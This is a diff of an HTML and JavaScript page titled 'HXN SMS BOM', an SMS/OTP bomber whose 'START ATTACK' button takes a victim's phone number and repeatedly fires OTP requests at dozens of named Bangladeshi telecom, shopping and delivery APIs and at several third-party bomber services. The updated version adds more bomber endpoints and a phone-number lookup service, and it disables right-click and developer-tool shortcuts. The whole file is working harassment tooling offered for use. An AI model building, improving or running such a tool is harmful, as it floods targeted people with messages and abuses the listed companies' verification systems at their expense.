@@ -1,142 +1,282 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>HXN SMS BOM</title>
-  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap" rel="stylesheet" />
-  <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Orbitron', sans-serif; }
-    body { background: #0f0f0f; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-    canvas { position: fixed; top: 0; left: 0; z-index: -1; }
-    .container { z-index: 1; background: rgba(20, 20, 20, 0.95); padding: 30px; border-radius: 15px; box-shadow: 0 0 20px #ff0000a0; text-align: center; width: 90%; max-width: 400px; }
-    input, button { width: 100%; padding: 12px; margin: 10px 0; border: none; border-radius: 8px; outline: none; }
-    input { background: #1f1f1f; color: #fff; box-shadow: 0 0 5px #ffaa00; }
-    button { background: #ff0000; color: white; font-weight: bold; cursor: pointer; transition: 0.3s ease; box-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000; }
-    button:hover { background: #cc0000; box-shadow: 0 0 20px #ff0000; }
-    #progressContainer { width: 100%; background: #222; border-radius: 10px; margin-top: 15px; border: 1px solid #444; padding: 3px; display: none; }
-    #progressBar { width: 0%; height: 15px; background: linear-gradient(90deg, #ff0000, #880000); border-radius: 8px; transition: width 0.1s; }
-    .alert { font-size: 16px; margin-top: 10px; }
-    .success { color: #00ff00; } .failure { color: #ff3333; } .default { color: #ffffff; }
-    #countdownTimer { font-size: 16px; color: #ffaa00; margin-top: 10px; }
-  </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>HXN SMS BOM</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap" rel="stylesheet" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Orbitron', sans-serif;
+    }
+
+    body {
+      background: #0f0f0f;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      overflow: hidden;
+    }
+
+    canvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: -1;
+    }
+
+    .container {
+      z-index: 1;
+      background: rgba(20, 20, 20, 0.95);
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 0 20px #ff0000a0;
+      text-align: center;
+      width: 90%;
+      max-width: 400px;
+    }
+
+    input, button {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 8px;
+      outline: none;
+    }
+
+    input {
+      background: #1f1f1f;
+      color: #fff;
+      box-shadow: 0 0 5px #ffaa00;
+    }
+
+    button {
+      background: #ff0000;
+      color: white;
+      font-weight: bold;
+      box-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000;
+      cursor: pointer;
+      transition: 0.3s ease;
+    }
+
+    button:hover {
+      background: #cc0000;
+      box-shadow: 0 0 20px #ff0000;
+    }
+
+    #progressContainer {
+      width: 100%;
+      background: #222;
+      border-radius: 10px;
+      margin-top: 15px;
+      border: 1px solid #444;
+      padding: 3px;
+      display: none;
+    }
+
+    #progressBar {
+      width: 0%;
+      height: 15px;
+      background: linear-gradient(90deg, #ff0000, #880000);
+      border-radius: 8px;
+      transition: width 0.3s;
+    }
+
+    .alert {
+      font-size: 16px;
+      margin-top: 10px;
+    }
+
+    .success { color: #00ff00; }
+    .failure { color: #ff3333; }
+    .default { color: #ffffff; }
+
+    #countdownTimer {
+      font-size: 16px;
+      color: #ffaa00;
+      margin-top: 10px;
+    }
+  </style>
 </head>
 <body>
-  <canvas id="matrixCanvas"></canvas>
-  <div class="container" id="mainContainer">
-    <h1>HXN SMS BOM</h1>
-    <input type="text" id="phoneNumber" placeholder="Target Number (11 Digit)">
-    <input type="number" id="amount" placeholder="Amount (Max 20)">
-    <button onclick="sendOTP()">START ATTACK</button>
-    <div id="countdownTimer"></div>
-    <div id="progressContainer"><div id="progressBar"></div></div>
-    <div id="responseMessage" class="alert default">Status: Ready...</div>
-  </div>
+  <canvas id="matrixCanvas"></canvas>
 
-  <audio id="successSound" src="https://actions.google.com/sounds/v1/cartoon/clang_and_wobble.ogg" preload="auto"></audio>
+  <div class="container" id="mainContainer">
+    <h1>HXN SMS BOM</h1>
+    <input type="text" id="phoneNumber" placeholder="Target Number +88XX">
+    <input type="number" id="amount" placeholder="Request Amount">
+    <button onclick="sendOTP()">START ATTACK</button>
+    
+    <div id="loadingSpinner"></div>
+    <div id="countdownTimer"></div>
+    <div id="progressContainer">
+      <div id="progressBar"></div>
+    </div>
+    <div id="responseMessage" class="alert default">Status: Ready...</div>
+  </div>
 
-  <script>
-    async function sendRequest(url, method = 'GET', data = null) {
-      try {
-        let options = { method, headers: { 'Content-Type': 'application/json' }, mode: 'no-cors' };
-        if (data) options.body = JSON.stringify(data);
-        await fetch(url, options);
-        return true;
-      } catch (e) { return false; }
-    }
+  <audio id="successSound" src="https://actions.google.com/sounds/v1/cartoon/clang_and_wobble.ogg" preload="auto"></audio>
 
-    async function sendOTP() {
-      const phone = document.getElementById('phoneNumber').value;
-      const amount = parseInt(document.getElementById('amount').value);
-      const responseMessage = document.getElementById('responseMessage');
-      const timerDisplay = document.getElementById('countdownTimer');
-      const progressContainer = document.getElementById('progressContainer');
-      const progressBar = document.getElementById('progressBar');
+  <script>
+    async function sendRequest(url, method = 'GET', data = null) {
+      try {
+        let options = { method, headers: { 'Content-Type': 'application/json' } };
+        if (data) options.body = JSON.stringify(data);
+        let res = await fetch(url, options);
+        return res.status >= 200 && res.status < 300;
+      } catch (e) {
+        return false;
+      }
+    }
 
-      if (!/^\d{11}$/.test(phone)) {
-        responseMessage.innerHTML = '<span class="alert failure">Invalid Number!</span>';
-        return;
-      }
+    function delay(ms) {
+      return new Promise(resolve => setTimeout(resolve, ms));
+    }
 
-      progressContainer.style.display = 'block';
-      responseMessage.innerHTML = '<span class="alert default">Attack Started...</span>';
+    async function sendOTP() {
+      const phone = document.getElementById('phoneNumber').value;
+      const amount = parseInt(document.getElementById('amount').value);
+      const responseMessage = document.getElementById('responseMessage');
+      const timerDisplay = document.getElementById('countdownTimer');
+      const progressContainer = document.getElementById('progressContainer');
+      const progressBar = document.getElementById('progressBar');
+      const sound = document.getElementById('successSound');
 
-      let apis = [
-        { url: `https://expcyber.my.id/apis/v1.php?phone=${phone}`, method: 'GET' },
-        { url: `https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${phone}`, method: 'GET' },
-        { url: `https://cokestudio23.sslwireless.com/api/check-gp-number`, method: 'POST', data: { msisdn: phone } },
-        { url: `https://weblogin.grameenphone.com/backend/api/v1/otp`, method: 'POST', data: { msisdn: phone } },
-        { url: `https://apix.rabbitholebd.com/appv2/login/requestOTP`, method: 'POST', data: { mobile: phone } },
-        { url: `https://api.osudpotro.com/api/v1/users/send_otp`, method: 'POST', data: { mobile: phone, deviceToken: "web" } },
-        { url: `https://api.swap.com.bd/api/v1/send-otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.bd.airtel.com/v1/account/login/otp`, method: 'POST', data: { phone_number: phone } },
-        { url: `https://eshop-api.banglalink.net/api/v1/customer/send-otp`, method: 'POST', data: { type: 'phone', phone: phone } },
-        { url: `https://tcsbomberai.vercel.app/api/smsbomber?phone=${phone}`, method: 'GET' },
-        { url: `https://member.daraz.com.bd/user/api/send_otp`, method: 'POST', data: { phone: phone, type: 'login' } },
-        { url: `https://api.pathao.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://www.chaldal.com/api/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.hungrynaki.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.bdtickets.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.shohoz.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.foodpanda.com.bd/api/v2/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.sheba.xyz/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.ajkerdeal.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.shwapno.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.evaly.com.bd/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.clicknshop.com.bd/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.pickaboo.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.priyoshop.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.startech.com.bd/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.ryanscomputers.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.techlandbd.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.skder.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.deligram.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.oasbd.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.bagdoom.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.rokomari.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.boibazar.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.eorange.shop/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.dhamakashopping.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.aleshamart.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.qcoom.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.boishakhi.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
-        { url: `https://api.need.com.bd/v1/user/otp`, method: 'POST', data: { phone: phone } }
-      ];
+      if (!/^\d{11}$/.test(phone) || isNaN(amount) || amount <= 0) {
+        responseMessage.innerHTML = '<span class="alert failure">Invalid Number or Amount!</span>';
+        return;
+      }
 
-      for (let i = 0; i < amount; i++) {
-        timerDisplay.innerText = `Attacks Remaining: ${amount - i}`;
-        // Parallel Hits: সব রিকোয়েস্ট বিদ্যুৎ গতিতে একসাথে যাবে
-        await Promise.all(apis.map(api => sendRequest(api.url, api.method, api.data)));
-        progressBar.style.width = ((i + 1) / amount * 100) + '%';
-        await new Promise(r => setTimeout(r, 100)); // সামান্য বিরতি যাতে ব্রাউজার হ্যাং না করে
-      }
+      if (amount > 20) {
+        responseMessage.innerHTML = '<span class="alert failure">Error: Maximum limit is 20!</span>';
+        return;
+      }
 
-      timerDisplay.innerText = "";
-      responseMessage.innerHTML = '<span class="alert success">Attack Finished!</span>';
-      document.getElementById('successSound').play();
-    }
+      progressContainer.style.display = 'block';
+      progressBar.style.width = '0%';
+      responseMessage.innerHTML = '<span class="alert default">Attack Started...</span>';
 
-    // Matrix Rain Animation
-    const canvas = document.getElementById('matrixCanvas');
-    const ctx = canvas.getContext('2d');
-    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-    const letters = "01010101HXN";
-    const fontSize = 16;
-    const columns = canvas.width / fontSize;
-    const drops = Array.from({ length: columns }).fill(1);
-    function draw() {
-      ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
-      ctx.fillRect(0, 0, canvas.width, canvas.height);
-      ctx.fillStyle = "#0F0";
-      ctx.font = fontSize + "px monospace";
-      for (let i = 0; i < drops.length; i++) {
-        const text = letters[Math.floor(Math.random() * letters.length)];
-        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
-        drops[i]++;
-      }
-    }
-    setInterval(draw, 35);
-  </script>
+      let apis = [
+        { url: `https://expcyber.my.id/apis/v1.php?phone=${phone}`, method: 'GET' },
+        { url: `https://lmnx9.xyz/boom/free.php?number=${phone}&amount=${amount}`, method: 'GET' },
+        { url: `https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${phone}`, method: 'GET' },
+        { url: `https://cokestudio23.sslwireless.com/api/check-gp-number`, method: 'POST', data: { msisdn: phone } },
+        { url: `https://weblogin.grameenphone.com/backend/api/v1/otp`, method: 'POST', data: { msisdn: phone } },
+        { url: `https://apix.rabbitholebd.com/appv2/login/requestOTP`, method: 'POST', data: { mobile: phone } },
+        { url: `https://api.osudpotro.com/api/v1/users/send_otp`, method: 'POST', data: { mobile: phone, deviceToken: "web", language: "en", os: "web" } },
+        { url: `https://fundesh.com.bd/api/auth/generateOTP?service_key=`, method: 'POST', data: { msisdn: phone } },
+        { url: `https://api.swap.com.bd/api/v1/send-otp`, method: 'POST', data: { phone: phone } },
+        { url: `https://api.bd.airtel.com/v1/account/login/otp`, method: 'POST', data: { phone_number: phone } },
+        { url: `https://eshop-api.banglalink.net/api/v1/customer/send-otp`, method: 'POST', data: { type: 'phone', phone: phone } },
+        { url: `https://cherykuwait.com/topbomb.php?phone=${phone}&amount=${amount}`, method: 'GET' },
+        { url: `https://tcsbomberai.vercel.app/api/smsbomber?phone=${phone}`, method: 'GET' },
+        { url: `https://ck638.ct.ws/?number=${phone}`, method: 'GET' },
+        { url: `https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=${phone}`, method: 'GET' },
+        { url: `https://bj-x-coder.top/bo_m_ber.php?phone=${phone}&amount=${amount}`, method: 'GET' },
+        { url: `https://zeron-num-info2o.vercel.app/api/search?num=${phone}`, method: 'GET' },
+        { url: `https://lmnx9.appletolha.com/boom/free.php?number=${phone}&amount=${amount}`, method: 'GET' },
+        { url: `https://lmnx9.appletolha.com/call-boomber/trial.php?number=${phone}`, method: 'GET' },
+        { url: `https://member.daraz.com.bd/user/api/send_otp`, method: 'POST', data: { phone: phone, type: 'login' } },
+        { url: `https://api.pathao.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+        { url: `https://www.chaldal.com/api/v1/user/otp`, method: 'POST', data: { phone: phone } },
+        { url: `https://api.hungrynaki.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+        { url: `https://api.bdtickets.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+        { url: `https://api.shohoz.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+        { url: `https://api.foodpanda.com.bd/api/v2/otp`, method: 'POST', data: { phone: phone } },
+        { url: `https://api.sheba.xyz/v1/user/otp`, method: 'POST', data: { phone: phone } },
+        { url: `https://api.ajkerdeal.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+        { url: `https://api.shwapno.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+        { url: `https://api.evaly.com.bd/v1/user/otp`, method: 'POST', data: { phone: phone } },
+        { url: `https://api.clicknshop.com.bd/v1/user/otp`, method: 'POST', data: { phone: phone } },
+        { url: `https://api.pickaboo.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+        { url: `https://api.priyoshop.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+        { url: `https://api.startech.com.bd/v1/user/otp`, method: 'POST', data: { phone: phone } },
+        { url: `https://api.ryanscomputers.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+        { url: `https://api.techlandbd.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+        { url: `https://api.skder.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+        { url: `https://api.deligram.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+        { url: `https://api.oasbd.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+        { url: `https://api.bagdoom.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+        { url: `https://api.rokomari.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+        { url: `https://api.boibazar.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+        { url: `https://api.eorange.shop/v1/user/otp`, method: 'POST', data: { phone: phone } },
+        { url: `https://api.dhamakashopping.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+        { url: `https://api.aleshamart.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+        { url: `https://api.qcoom.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+        { url: `https://api.boishakhi.com/v1/user/otp`, method: 'POST', data: { phone: phone } },
+        { url: `https://api.need.com.bd/v1/user/otp`, method: 'POST', data: { phone: phone } }
+      ];
+
+      let successCount = 0;
+      for (let i = 0; i < amount; i++) {
+        timerDisplay.innerText = `Time Left: ${amount - i}s`;
+        
+        for (let api of apis) {
+          let result = await sendRequest(api.url, api.method, api.data);
+          if (result) successCount++;
+        }
+
+        let progress = ((i + 1) / amount) * 100;
+        progressBar.style.width = progress + '%';
+        await delay(1000); 
+      }
+
+      // ১ নম্বর জায়গা ক্লিয়ার এবং সাকসেস মেসেজ (৩ নম্বর)
+      timerDisplay.innerText = ""; 
+
+      if (successCount > 0) {
+        responseMessage.innerHTML = `<span class="alert success">Attack Complete! (${successCount} Hits)</span>`;
+        if (typeof sound !== 'undefined') sound.play();
+      } else {
+        responseMessage.innerHTML = `<span class="alert failure">Attack Failed!</span>`;
+      }
+    }
+
+    // Matrix Rain Animation
+    const canvas = document.getElementById('matrixCanvas');
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+
+    const letters = "01010101PHANTOMVOID";
+    const fontSize = 16;
+    const columns = canvas.width / fontSize;
+    const drops = Array.from({ length: columns }).fill(1);
+
+    function draw() {
+      ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      ctx.fillStyle = "#0F0";
+      ctx.font = fontSize + "px monospace";
+      for (let i = 0; i < drops.length; i++) {
+        const text = letters[Math.floor(Math.random() * letters.length)];
+        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+        drops[i]++;
+      }
+    }
+    setInterval(draw, 35);
+
+    window.addEventListener('resize', () => {
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+    });
+
+    // Security Features
+    (function () {
+      document.addEventListener("contextmenu", e => e.preventDefault());
+      document.addEventListener("keydown", e => {
+        if (e.key === "F12" || (e.ctrlKey && e.shiftKey && ["I", "C", "J"].includes(e.key)) || (e.ctrlKey && e.key === "U")) {
+          e.preventDefault();
+        }
+      });
+    })();
+  </script>
 </body>
 </html>
